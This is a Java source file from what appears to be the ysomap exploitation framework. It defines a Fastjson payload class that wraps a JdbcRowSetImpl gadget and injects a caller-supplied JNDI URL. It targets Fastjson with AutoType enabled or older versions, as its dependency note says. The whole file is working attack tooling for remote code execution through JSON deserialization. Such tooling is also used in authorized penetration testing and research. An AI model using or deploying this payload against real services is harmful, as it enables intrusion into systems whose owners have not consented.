package ysomap.payloads.json;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.bullets.json.JdbcRowSetImplJsonBullet;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2020/3/18
 */
@SuppressWarnings({"rawtypes"})
@Payloads
@Targets({Targets.FASTJSON})
@Authors({ Authors.WH1T3P1G })
@Require(bullets = {"JdbcRowSetImplJsonBullet","TemplatesImplJsonBullet"}, param = false)
@Dependencies({"开启AutoType 或 低版本fastjson"})
public class FastJSONPayload1 extends FastJsonPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        Bullet bullet = new JdbcRowSetImplJsonBullet();
        ReflectionHelper.set(bullet, "jndiURL", args[0]);
        return bullet;
    }

    @Override
    public Object pack(Object obj) throws Exception {
        return obj;
    }
}
